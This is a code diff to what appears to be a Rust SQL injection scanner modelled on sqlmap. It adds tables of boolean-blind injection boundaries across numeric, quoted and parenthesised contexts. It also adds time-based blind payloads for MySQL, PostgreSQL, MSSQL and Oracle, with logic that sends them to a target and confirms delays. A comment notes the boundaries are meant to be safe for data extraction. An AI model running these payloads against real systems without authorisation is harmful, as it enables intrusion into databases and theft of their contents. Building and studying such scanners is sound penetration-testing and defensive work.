@@ -34,23 +34,38 @@ struct BoolBoundary {
     false_payload: &'static str,
 }
 
+// Boundary matrix modelled on sqlmap's boundaries: numeric, single-quote,
+// double-quote and parenthesised contexts, each terminated by a comment so the
+// trailing application syntax is neutralised (these are extraction-safe). The
+// paired-quote variants (no comment) are kept last as detection-only fallbacks.
 const BOOL_BOUNDARIES: &[BoolBoundary] = &[
-    BoolBoundary {
-        prefix: "1",
-        suffix: "-- -",
-        true_code: "AND 1=1",
-        false_code: "AND 1=2",
-        true_payload: "1 AND 1=1-- -",
-        false_payload: "1 AND 1=2-- -",
-    },
-    BoolBoundary {
-        prefix: "1'",
-        suffix: "",
-        true_code: "AND '1'='1",
-        false_code: "AND '1'='2",
-        true_payload: "1' AND '1'='1",
-        false_payload: "1' AND '1'='2",
-    },
+    // Numeric context
+    BoolBoundary { prefix: "1", suffix: "-- -", true_code: "AND 1=1", false_code: "AND 1=2",
+        true_payload: "1 AND 1=1-- -", false_payload: "1 AND 1=2-- -" },
+    BoolBoundary { prefix: "1", suffix: "#", true_code: "AND 1=1", false_code: "AND 1=2",
+        true_payload: "1 AND 1=1#", false_payload: "1 AND 1=2#" },
+    // Single-quote string context
+    BoolBoundary { prefix: "1'", suffix: "-- -", true_code: "AND 1=1", false_code: "AND 1=2",
+        true_payload: "1' AND 1=1-- -", false_payload: "1' AND 1=2-- -" },
+    BoolBoundary { prefix: "1'", suffix: "#", true_code: "AND 1=1", false_code: "AND 1=2",
+        true_payload: "1' AND 1=1#", false_payload: "1' AND 1=2#" },
+    // Double-quote string context
+    BoolBoundary { prefix: "1\"", suffix: "-- -", true_code: "AND 1=1", false_code: "AND 1=2",
+        true_payload: "1\" AND 1=1-- -", false_payload: "1\" AND 1=2-- -" },
+    // Parenthesised numeric context
+    BoolBoundary { prefix: "1)", suffix: "-- -", true_code: "AND (1=1)", false_code: "AND (1=2)",
+        true_payload: "1) AND (1=1)-- -", false_payload: "1) AND (1=2)-- -" },
+    // Parenthesised single-quote context
+    BoolBoundary { prefix: "1')", suffix: "-- -", true_code: "AND (1=1)", false_code: "AND (1=2)",
+        true_payload: "1') AND (1=1)-- -", false_payload: "1') AND (1=2)-- -" },
+    // Double-parenthesised single-quote context
+    BoolBoundary { prefix: "1'))", suffix: "-- -", true_code: "AND ((1=1))", false_code: "AND ((1=2))",
+        true_payload: "1')) AND ((1=1))-- -", false_payload: "1')) AND ((1=2))-- -" },
+    // Paired-quote fallbacks (detection-only; no comment terminator)
+    BoolBoundary { prefix: "1'", suffix: "", true_code: "AND '1'='1", false_code: "AND '1'='2",
+        true_payload: "1' AND '1'='1", false_payload: "1' AND '1'='2" },
+    BoolBoundary { prefix: "1\"", suffix: "", true_code: "AND \"1\"=\"1", false_code: "AND \"1\"=\"2",
+        true_payload: "1\" AND \"1\"=\"1", false_payload: "1\" AND \"1\"=\"2" },
 ];
 
 /// Check if target is vulnerable to boolean-based blind SQLi.
@@ -93,48 +108,89 @@ pub async fn check_boolean_blind(request: &Request<'_>) -> Result<Option<BlindVe
 }
 
 /// Check if target is vulnerable to time-based blind SQLi
+/// Number of seconds each time-based payload should delay the response.
+const TIME_DELAY: u64 = 5;
+
+/// A time-based probe: a DBMS-specific payload that sleeps `TIME_DELAY` seconds.
+struct TimeProbe {
+    dbms: DBMS,
+    prefix: &'static str,
+    suffix: &'static str,
+    true_code: &'static str,
+    payload: &'static str,
+}
+
+const TIME_PROBES: &[TimeProbe] = &[
+    // MySQL / MariaDB
+    TimeProbe { dbms: DBMS::MySQL, prefix: "1", suffix: "-- -",
+        true_code: "AND SLEEP(5)", payload: "1 AND SLEEP(5)-- -" },
+    TimeProbe { dbms: DBMS::MySQL, prefix: "1'", suffix: "-- -",
+        true_code: "AND SLEEP(5)", payload: "1' AND SLEEP(5)-- -" },
+    // PostgreSQL
+    TimeProbe { dbms: DBMS::PostgreSQL, prefix: "1", suffix: "-- -",
+        true_code: "AND (SELECT 1 FROM pg_sleep(5))", payload: "1 AND (SELECT 1 FROM pg_sleep(5))-- -" },
+    TimeProbe { dbms: DBMS::PostgreSQL, prefix: "1'", suffix: "-- -",
+        true_code: "AND (SELECT 1 FROM pg_sleep(5))", payload: "1' AND (SELECT 1 FROM pg_sleep(5))-- -" },
+    // Microsoft SQL Server (stacked WAITFOR)
+    TimeProbe { dbms: DBMS::MSSQL, prefix: "1", suffix: "-- -",
+        true_code: "; WAITFOR DELAY '0:0:5'", payload: "1; WAITFOR DELAY '0:0:5'-- -" },
+    TimeProbe { dbms: DBMS::MSSQL, prefix: "1'", suffix: "-- -",
+        true_code: "'; WAITFOR DELAY '0:0:5'", payload: "1'; WAITFOR DELAY '0:0:5'-- -" },
+    // Oracle
+    TimeProbe { dbms: DBMS::Oracle, prefix: "1", suffix: "-- -",
+        true_code: "AND 1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)",
+        payload: "1 AND 1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- -" },
+    TimeProbe { dbms: DBMS::Oracle, prefix: "1'", suffix: "-- -",
+        true_code: "AND 1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)",
+        payload: "1' AND 1234=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),5)-- -" },
+];
+
+/// Check if the target is vulnerable to time-based blind SQLi.
+///
+/// Hardened over the original single-sample MySQL/PostgreSQL check:
+///  - establishes a stable baseline from the median of several samples;
+///  - covers MySQL, PostgreSQL, MSSQL (WAITFOR) and Oracle (DBMS_PIPE);
+///  - requires a *confirmatory* second delayed response before reporting, which
+///    rules out one-off network jitter.
 pub async fn check_time_blind(request: &Request<'_>) -> Result<Option<BlindVector>> {
-    let delay = 5u64;
-    
-    // Test without delay first
-    let start = Instant::now();
-    let _ = request.query_page("1").await?;
-    let normal_time = start.elapsed();
-    
-    // Test MySQL SLEEP
-    let start = Instant::now();
-    let _ = request.query_page(&format!("1 AND SLEEP({})-- -", delay)).await?;
-    let sleep_time = start.elapsed();
-    
-    if sleep_time > Duration::from_secs(delay - 1) && sleep_time > normal_time * 3 {
+    // Baseline: median of a few quick samples to absorb jitter.
+    let mut samples = Vec::new();
+    for _ in 0..3 {
+        let start = Instant::now();
+        let _ = request.query_page("1").await?;
+        samples.push(start.elapsed());
+    }
+    samples.sort();
+    let normal_time = samples[samples.len() / 2];
+
+    // A genuine delay must clear (DELAY - 1)s and be well above baseline.
+    let threshold = Duration::from_secs(TIME_DELAY - 1).max(normal_time * 3);
+
+    for probe in TIME_PROBES {
+        let start = Instant::now();
+        let _ = request.query_page(probe.payload).await?;
+        if start.elapsed() < threshold {
+            continue;
+        }
+
+        // Confirm with a second request to rule out a transient slow response.
+        let start = Instant::now();
+        let _ = request.query_page(probe.payload).await?;
+        if start.elapsed() < threshold {
+            continue;
+        }
+
         return Ok(Some(BlindVector {
-            dbms: DBMS::MySQL,
-            prefix: "1".to_string(),
-            suffix: "-- -".to_string(),
-            true_code: format!("AND SLEEP({})", delay),
+            dbms: probe.dbms,
+            prefix: probe.prefix.to_string(),
+            suffix: probe.suffix.to_string(),
+            true_code: probe.true_code.to_string(),
             false_code: "AND 1=1".to_string(),
             time_based: true,
-            delay,
+            delay: TIME_DELAY,
         }));
     }
-    
-    // Test PostgreSQL pg_sleep
-    let start = Instant::now();
-    let _ = request.query_page(&format!("1 AND (SELECT pg_sleep({}))-- -", delay)).await?;
-    let sleep_time = start.elapsed();
-    
-    if sleep_time > Duration::from_secs(delay - 1) && sleep_time > normal_time * 3 {
-        return Ok(Some(BlindVector {
-            dbms: DBMS::PostgreSQL,
-            prefix: "1".to_string(),
-            suffix: "-- -".to_string(),
-            true_code: format!("AND (SELECT pg_sleep({}))", delay),
-            false_code: "AND 1=1".to_string(),
-            time_based: true,
-            delay,
-        }));
-    }
-    
+
     Ok(None)
 }
 
